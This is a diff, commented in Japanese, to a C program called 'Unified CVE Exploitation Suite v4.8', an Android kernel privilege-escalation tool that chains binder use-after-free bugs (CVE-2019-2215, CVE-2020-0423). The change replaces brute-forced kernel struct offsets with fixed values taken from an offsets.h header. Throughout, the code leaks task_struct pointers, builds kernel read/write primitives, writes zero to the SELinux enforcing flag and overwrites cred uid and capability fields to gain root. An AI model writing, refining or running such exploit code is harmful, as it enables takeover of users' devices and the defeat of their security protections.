@@ -28,6 +28,7 @@
 #include <stdint.h>
 #include <sys/fsuid.h>
 #include "binder.h"
+#include "offsets.h"            /* 追加: 正しいオフセット定義 */
 
 extern int setfsuid(uid_t);
 extern int setfsgid(gid_t);
@@ -98,33 +99,10 @@ static int g_epoll_fd = -1;
 static int g_krw_pipe[2] = {-1, -1};
 static uint64_t g_task_struct = 0;
 static uint64_t g_cred_ptr = 0;
-static int g_cred_off = -1;
-static int g_al_off = -1;
+static int g_cred_off = TASK_REAL_CRED_OFF;   /* offsets.h の正しい値 */
+static int g_al_off = 0;                     /* 未使用 */
 static int g_root_achieved = 0;
 static int g_system_privilege = 0;
-
-static struct {
-    int cred;
-    int al;
-} g_offset_candidates[] = {
-    {0x680, 0xA18}, {0x688, 0xA18}, {0x690, 0xA18},
-    {0x680, 0xA20}, {0x688, 0xA20}, {0x690, 0xA20},
-    {0x680, 0x9A0}, {0x688, 0x9A0}, {0x690, 0x9A0},
-    {0x6A0, 0xA18}, {0x6A0, 0xA20}, {0x6A0, 0x9A0},
-    {0x6B0, 0xA18}, {0x6B0, 0xA20}, {0x6B0, 0x9A0},
-    {0x6C0, 0xA18}, {0x6C0, 0xA20}, {0x6C0, 0x9A0},
-    {0x700, 0xA18}, {0x700, 0xA20}, {0x700, 0x9A0},
-    {0x708, 0xA18}, {0x708, 0xA20}, {0x708, 0x9A0},
-    {0x710, 0xA18}, {0x710, 0xA20}, {0x710, 0x9A0},
-    {0x718, 0xA18}, {0x718, 0xA20}, {0x718, 0x9A0},
-    {0x720, 0xA18}, {0x720, 0xA20}, {0x720, 0x9A0},
-    {0x728, 0xA18}, {0x728, 0xA20}, {0x728, 0x9A0},
-    {0x730, 0xA18}, {0x730, 0xA20}, {0x730, 0x9A0},
-    {0x980, 0xA18}, {0x988, 0xA18}, {0x990, 0xA18},
-    {0x998, 0xA18}, {0x9A0, 0xA18}, {0x9A8, 0xA18},
-    {0x9B0, 0xA18}, {0x9B8, 0xA18}, {0x9C0, 0xA18}
-};
-#define NUM_OFFSETS (sizeof(g_offset_candidates)/sizeof(g_offset_candidates[0]))
 
 /* Utilities */
 static void bind_cpu(void) {
@@ -320,6 +298,7 @@ static int test_cve_2020_0423(void) {
 
 /* ============================================================
    CVE-2019-2215 Leak with readv and overlapping iovec
+   修正: 正しい cred_off (TASK_REAL_CRED_OFF) を固定で使用
    ============================================================ */
 static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
     int pipefd[2], fd, epoll_fd;
@@ -389,7 +368,6 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
         _exit(0);
     }
 
-    /* Use readv with overlapping iovec to read pipe buffer */
     n = readv(pipefd[0], iovec_stack + OVERLAP_INDEX, 2);
     wait(NULL);
 
@@ -405,24 +383,11 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
         uint64_t val = data[i];
         if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
             g_task_struct = val;
-            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                    g_cred_off = g_offset_candidates[ci].cred;
-                    g_al_off = g_offset_candidates[ci].al;
-                    *cred_off_out = g_cred_off;
-                    *al_off_out = g_al_off;
-                    printf("  [+] Found: task_struct=0x%llx, cred=0x%x, al=0x%x\n",
-                           (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                    return 0;
-                }
-            }
-            g_cred_off = 0x688;
-            g_al_off = 0xA18;
+            g_cred_off = TASK_REAL_CRED_OFF;   /* offsets.h の正しい値 */
             *cred_off_out = g_cred_off;
-            *al_off_out = g_al_off;
-            printf("  [+] Leaked task_struct @ 0x%llx (using fallback offsets)\n",
-                   (unsigned long long)g_task_struct);
+            *al_off_out = 0;
+            printf("  [+] Found task_struct=0x%llx, cred_off=0x%x\n",
+                   (unsigned long long)g_task_struct, g_cred_off);
             return 0;
         }
     }
@@ -493,6 +458,7 @@ static int setup_kernel_rw(void) {
 
 /* ============================================================
    CVE-2020-0423 RW with spray after free (improved timing)
+   修正: 正しい cred_off を固定で使用
    ============================================================ */
 static int exploit_cve_2020_0423_rw(void) {
     printf("[*] Attempting kernel RW via CVE-2020-0423 UAF (spray after free)...\n");
@@ -583,59 +549,18 @@ static int exploit_cve_2020_0423_rw(void) {
             if (sz <= 0) continue;
 
             uint64_t *data = (uint64_t *)leak_buf;
-            uint64_t binder_proc = 0;
-            uint64_t task_addr = 0;
-
             for (size_t k = 0; k < (size_t)(sz / 8); k++) {
                 uint64_t val = data[k];
                 if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                    if (binder_proc == 0) binder_proc = val;
-                    task_addr = val;
-                }
-                if ((val & 0xFFFFFFFF00000000LL) == 0xFFFFFF8000000000LL) {
-                    if (binder_proc == 0) binder_proc = val;
-                    task_addr = val;
+                    g_task_struct = val;
+                    g_cred_off = TASK_REAL_CRED_OFF;
+                    printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x)\n",
+                           (unsigned long long)g_task_struct, g_cred_off);
+                    found = 1;
+                    break;
                 }
             }
-
-            if (binder_proc != 0) {
-                int task_offsets[] = {0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60};
-                for (int off_idx = 0; off_idx < 9; off_idx++) {
-                    uint64_t candidate = binder_proc + task_offsets[off_idx];
-                    if ((candidate & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                        g_task_struct = candidate;
-                        for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                            uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                            if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                                g_cred_off = g_offset_candidates[ci].cred;
-                                g_al_off = g_offset_candidates[ci].al;
-                                printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
-                                       (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                                found = 1;
-                                break;
-                            }
-                        }
-                        if (found) break;
-                    }
-                }
-                if (found) break;
-            }
-
-            if (task_addr != 0) {
-                g_task_struct = task_addr;
-                for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                    uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                    if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                        g_cred_off = g_offset_candidates[ci].cred;
-                        g_al_off = g_offset_candidates[ci].al;
-                        printf("  [+] Leaked task_struct directly @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
-                               (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                        found = 1;
-                        break;
-                    }
-                }
-                if (found) break;
-            }
+            if (found) break;
         }
 
         for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
@@ -771,48 +696,28 @@ static int exploit_cve_2021_1961(void) {
     return 0;
 }
 
-/* CVE-2023-20938 inspired: SELinux permissive */
+/* CVE-2023-20938 inspired: SELinux permissive using offsets.h */
 static int try_selinux_disable_via_kernel(void) {
     printf("[*] Attempting to disable SELinux via kernel memory write (CVE-2023-20938 inspired)...\n");
     if (g_krw_pipe[0] < 0) {
         printf("  [-] No kernel RW available\n");
         return -1;
     }
-    uint64_t selinux_state_addr = 0;
-    uint64_t search_addrs[] = {
-        0xFFFFFF8000000000ULL, 0xFFFFFF8008000000ULL,
-        0xFFFFFF8010000000ULL, 0xFFFFFF8020000000ULL,
-        0xFFFFFF8030000000ULL, 0xFFFFFF8040000000ULL, 0
-    };
-    for (int i = 0; search_addrs[i] != 0; i++) {
-        uint64_t addr = search_addrs[i];
-        if (write(g_krw_pipe[1], &addr, 8) != 8) continue;
-        uint64_t val;
-        if (read(g_krw_pipe[0], &val, 8) != 8) continue;
-        if (val == 1 || val == 0) {
-            selinux_state_addr = addr;
-            break;
-        }
-    }
-    if (selinux_state_addr == 0) {
-        for (uint64_t addr = 0xFFFFFF8000000000ULL; addr < 0xFFFFFF9000000000ULL; addr += 0x1000) {
-            if (write(g_krw_pipe[1], &addr, 8) != 8) continue;
-            uint64_t val;
-            if (read(g_krw_pipe[0], &val, 8) != 8) continue;
-            if (val == 1 || val == 0) {
-                selinux_state_addr = addr;
-                break;
-            }
-        }
-    }
-    if (selinux_state_addr == 0) {
-        printf("  [-] Could not locate selinux_state\n");
+
+    /* offsets.h から直接アドレスを計算 (KASLR の考慮は別途必要) */
+    uint64_t selinux_addr = SELINUX_ENFORCING;
+    printf("  [+] SELinux enforcing address from offsets.h: 0x%llx\n", (unsigned long long)selinux_addr);
+
+    /* 書き込み: 0 に設定して permissive にする */
+    uint32_t zero = 0;
+    if (write(g_krw_pipe[1], &selinux_addr, 8) != 8) {
+        perror("  write selinux addr");
         return -1;
     }
-    uint32_t zero = 0;
-    uint64_t addr = selinux_state_addr;
-    if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
-    if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
+    if (write(g_krw_pipe[1], &zero, 4) != 4) {
+        perror("  write zero");
+        return -1;
+    }
     printf("  [+] SELinux state set to permissive (0)\n");
     return 0;
 }
@@ -844,6 +749,7 @@ static int patch_kernel_cred(void) {
     uint32_t zero = 0;
     uint64_t cap_full = 0x3FFFFFFFFFULL;
 
+    /* これらのオフセットは cred 構造体に依存 (4.9 向けハードコード) */
     for (int off = 0x4; off <= 0x1C; off += 8) {
         uint64_t addr = g_cred_ptr + off;
         if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
@@ -864,7 +770,7 @@ static int patch_kernel_cred(void) {
     return 0;
 }
 
-/* Fallback methods */
+/* Fallback methods (unchanged) */
 static int try_all_setuid_methods(void) {
     printf("[*] Trying all setuid methods...\n");
     if (setuid(0) == 0) { printf("  [+] setuid(0) succeeded!\n"); return 0; }
@@ -1174,6 +1080,7 @@ int main(void) {
     int gpu_leak_ok = 0;
     int qseecom_ok = 0;
     uint64_t leaked_addr = 0;
+    int cred_off_dummy = -1, al_off_dummy = -1;  /* ダミー変数 */
 
     printf("==================================================\n");
     printf("  Unified CVE Exploitation Suite v4.8\n");
@@ -1196,8 +1103,7 @@ int main(void) {
     test_cve_2020_0423();
 
     printf("\n[PHASE 4] CVE-2019-2215 (legacy) with readv\n");
-    int cred_off = -1, al_off = -1;
-    if (leak_kernel_pointer(&cred_off, &al_off) == 0) {
+    if (leak_kernel_pointer(&cred_off_dummy, &al_off_dummy) == 0) {
         cve_2215_ok = 1;
         printf("  [+] Kernel pointer leaked successfully\n");
         if (setup_kernel_rw() == 0) {
@@ -1216,21 +1122,8 @@ int main(void) {
         printf("  [+] GPU leak successful: 0x%llx\n", (unsigned long long)leaked_addr);
         if (g_task_struct == 0) {
             g_task_struct = leaked_addr;
-            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                    g_cred_off = g_offset_candidates[ci].cred;
-                    g_al_off = g_offset_candidates[ci].al;
-                    printf("  [+] Found offsets via GPU leak: cred=0x%x, al=0x%x\n",
-                           g_cred_off, g_al_off);
-                    break;
-                }
-            }
-            if (g_cred_off < 0) {
-                g_cred_off = 0x688;
-                g_al_off = 0xA18;
-                printf("  [+] Using fallback offsets\n");
-            }
+            g_cred_off = TASK_REAL_CRED_OFF;
+            printf("  [+] Using cred_off=0x%x from offsets.h\n", g_cred_off);
             if (setup_kernel_rw() == 0) {
                 if (patch_kernel_cred() == 0) {
                     printf("  [+] Cred patched via GPU leak!\n");
